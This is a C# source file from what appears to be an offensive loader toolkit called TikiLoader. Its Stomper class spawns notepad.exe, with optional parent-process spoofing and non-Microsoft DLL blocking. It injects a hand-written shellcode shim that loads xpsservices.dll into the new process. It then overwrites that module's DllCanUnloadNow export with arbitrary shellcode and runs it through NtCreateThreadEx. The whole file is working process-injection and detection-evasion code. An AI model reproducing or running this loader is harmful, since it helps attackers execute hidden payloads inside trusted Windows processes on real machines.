﻿using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace TikiLoader
{
    public class Stomper
    {
        public string BinaryPath { get; set; } = "C:\\Windows\\System32\\notepad.exe";
        public string WorkingDirectory { get; set; } = "C:\\Windows\\System32";
        public string ModuleName { get; set; } = "xpsservices.dll";
        public string ExportName { get; set; } = "DllCanUnloadNow";

        public int ParentId { get; set; } = 0;
        public bool BlockDlls { get; set; } = false;

        private bool Is64Bit => IntPtr.Size == 8;

        public void Stomp(byte[] shellcode)
        {
            var pi = SpawnProcess();

            if (!LoadModule(pi))
                throw new Exception("Failed to load module in process");

            if (!WriteAndExecuteShellcode(pi, shellcode))
                throw new Exception("Failed to execute shellcode");
        }
        
        private Data.Win32.Kernel32.PROCESS_INFORMATION SpawnProcess()
        {
            var startupInfoEx = new Data.Win32.Kernel32.STARTUPINFOEX();
            startupInfoEx.Startupinfo.cb = (uint)Marshal.SizeOf(startupInfoEx);
            startupInfoEx.Startupinfo.dwFlags = (uint)Data.Win32.Kernel32.STARTF.STARTF_USESHOWWINDOW;
            
            var lpValue = Marshal.AllocHGlobal(IntPtr.Size);
            var lpSize = IntPtr.Zero;

            var attributeCount = 0;
            if (ParentId != 0) attributeCount++;
            if (BlockDlls) attributeCount++;
            
            // always false the first time, lpSize is given a value
            _ = Win32.InitializeProcThreadAttributeList(
                IntPtr.Zero,
                attributeCount,
                ref lpSize);

            startupInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
            
            // should be true this time
            var success = Win32.InitializeProcThreadAttributeList(
                startupInfoEx.lpAttributeList,
                attributeCount,
                ref lpSize);
            
            if (!success)
                throw new Exception("Failed to InitializeProcThreadAttributeList");

            if (BlockDlls)
            {
                Marshal.WriteIntPtr(lpValue,
                    Is64Bit ?
                        new IntPtr(Data.Win32.Kernel32.BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON)
                        : new IntPtr(unchecked((uint)Data.Win32.Kernel32.BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON)));
                
                success = Win32.UpdateProcThreadAttribute(
                    startupInfoEx.lpAttributeList,
                    (IntPtr)Data.Win32.Kernel32.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                    lpValue);

                if (!success)
                    throw new Exception("Failed to UpdateProcThreadAttribute for BlockDLLs");
            }

            if (ParentId != 0)
            {
                var hParent = Process.GetProcessById(ParentId).Handle;
                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValue, hParent);
                
                success = Win32.UpdateProcThreadAttribute(
                    startupInfoEx.lpAttributeList,
                    (IntPtr)Data.Win32.Kernel32.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    lpValue);
                
                if (!success)
                    throw new Exception("Failed to UpdateProcThreadAttribute for PPID Spoofing");
            }

            success = Win32.CreateProcessA(
                BinaryPath,
                WorkingDirectory,
                Data.Win32.Kernel32.EXTENDED_STARTUPINFO_PRESENT,
                startupInfoEx,
                out var pi);

            if (!success)
                throw new Exception($"Failed to spawn {BinaryPath}");

            // suppose we don't really care if this fails, it's not critical
            _ = Win32.DeleteProcThreadAttribute(startupInfoEx.lpAttributeList);
            Marshal.FreeHGlobal(lpValue);

            return pi;
        }

        private bool LoadModule(Data.Win32.Kernel32.PROCESS_INFORMATION pi)
        {
            // Get address of LoadLibraryExA
            var kernel32 = Generic.GetPebLdrModuleEntry("kernel32.dll");
            var loadLibraryEx = Generic.GetExportAddress(kernel32, "LoadLibraryExA");
            
            // Generate Shim
            var shim = GenerateShim((long)loadLibraryEx);
            var moduleName = Encoding.ASCII.GetBytes(ModuleName);
            
            // Allocate memory regions
            var baseAddress = IntPtr.Zero;
            var regionSize = new IntPtr(moduleName.Length + 2);

            // this one to hold the module name
            var allocModule = Native.NtAllocateVirtualMemory(
                pi.hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                Data.Win32.Kernel32.MEM_COMMIT | Data.Win32.Kernel32.MEM_RESERVE,
                Data.Win32.WinNT.PAGE_READWRITE);
            
            baseAddress = IntPtr.Zero;
            regionSize = new IntPtr(shim.Length);

            // this one to hold the shim
            var allocShim = Native.NtAllocateVirtualMemory(
                pi.hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                Data.Win32.Kernel32.MEM_COMMIT | Data.Win32.Kernel32.MEM_RESERVE,
                Data.Win32.WinNT.PAGE_READWRITE);

            // Write memory
            var buffer = Marshal.AllocHGlobal(moduleName.Length);
            Marshal.Copy(moduleName, 0, buffer, moduleName.Length);

            Native.NtWriteVirtualMemory(
                pi.hProcess,
                allocModule,
                buffer,
                (uint)moduleName.Length);

            Marshal.FreeHGlobal(buffer);

            buffer = Marshal.AllocHGlobal(shim.Length);
            Marshal.Copy(shim, 0, buffer, shim.Length);

            Native.NtWriteVirtualMemory(
                pi.hProcess,
                allocShim,
                buffer,
                (uint)shim.Length);

            Marshal.FreeHGlobal(buffer);
            
            // Change the shim region from RW to RX
            var size = new IntPtr(shim.Length);
            Native.NtProtectVirtualMemory(
                pi.hProcess,
                ref allocShim,
                ref size,
                Data.Win32.WinNT.PAGE_EXECUTE_READ);

            // Load DLL into process
            var hThread = IntPtr.Zero;
            Native.NtCreateThreadEx(
                ref hThread,
                Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                pi.hProcess,//process.Handle,
                allocShim,
                allocModule,
                false,
                0,
                0,
                0,
                IntPtr.Zero);

            // Wait for thread
            Win32.WaitForSingleObject(hThread, Data.Win32.WinNT.INFINITE);
            
            // Free memory regions
            size = IntPtr.Zero;
            Native.NtFreeVirtualMemory(
                pi.hProcess,
                ref allocModule,
                ref size,
                Data.Win32.Kernel32.MEM_RELEASE);

            Native.NtFreeVirtualMemory(
                pi.hProcess,
                ref allocShim,
                ref size,
                Data.Win32.Kernel32.MEM_RELEASE);

            using var process = Process.GetProcessById((int)pi.dwProcessId);
            return process.Modules.Cast<ProcessModule>().Any(module => module.ModuleName.Equals(ModuleName));
        }

        private bool WriteAndExecuteShellcode(Data.Win32.Kernel32.PROCESS_INFORMATION pi, byte[] shellcode)
        {
            // Calculate offset from base to exported function
            var hModule = Generic.LoadModuleFromDisk(ModuleName);
            var export = Generic.GetExportAddress(hModule, ExportName);
            var offset = (long)export - (long)hModule;

            var targetAddress = IntPtr.Zero;
            using var process = Process.GetProcessById((int)pi.dwProcessId);

            foreach (ProcessModule module in process.Modules)
            {
                if (!module.ModuleName.Equals(ModuleName, StringComparison.OrdinalIgnoreCase)) continue;

                targetAddress = new IntPtr((long)module.BaseAddress + offset);
                break;
            }

            // Write and execute shellcode
            var buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);

            var size = new IntPtr(shellcode.Length);
            Native.NtProtectVirtualMemory(
                process.Handle,
                ref targetAddress,
                ref size,
                Data.Win32.WinNT.PAGE_READWRITE);

            Native.NtWriteVirtualMemory(
                process.Handle,
                targetAddress,
                buffer,
                (uint)shellcode.Length);

            Native.NtProtectVirtualMemory(
                process.Handle,
                ref targetAddress,
                ref size,
                Data.Win32.WinNT.PAGE_EXECUTE_READ);

            Marshal.FreeHGlobal(buffer);

            var hThread = IntPtr.Zero;
            Native.NtCreateThreadEx(
                ref hThread,
                Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                process.Handle,
                targetAddress,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero);

            return hThread != IntPtr.Zero;
        }

        private byte[] GenerateShim(long loadLibraryExP)
        {
            using var ms = new MemoryStream();
            using var bw = new BinaryWriter(ms);

            if (Is64Bit)
            {
                bw.Write((ulong)loadLibraryExP);
                var loadLibraryExBytes = ms.ToArray();

                return new byte[] {
                    0x48, 0xB8, loadLibraryExBytes[0], loadLibraryExBytes[1], loadLibraryExBytes[2], loadLibraryExBytes[3], loadLibraryExBytes[4], loadLibraryExBytes[5], loadLibraryExBytes[6],loadLibraryExBytes[7],
                    0x49, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00,
                    0x48, 0x31, 0xD2,
                    0xFF, 0xE0
                };
            }
            else
            {
                bw.Write((uint)loadLibraryExP);
                var loadLibraryExBytes = ms.ToArray();

                return new byte[] {
                    0xB8, loadLibraryExBytes[0], loadLibraryExBytes[1], loadLibraryExBytes[2], loadLibraryExBytes[3],
                    0x6A, 0x01,
                    0x6A, 0x00,
                    0xFF, 0x74, 0x24, 0x0c,
                    0xFF, 0xD0,
                    0xC2, 0x0C, 0x00
                };
            }
        }
    }
}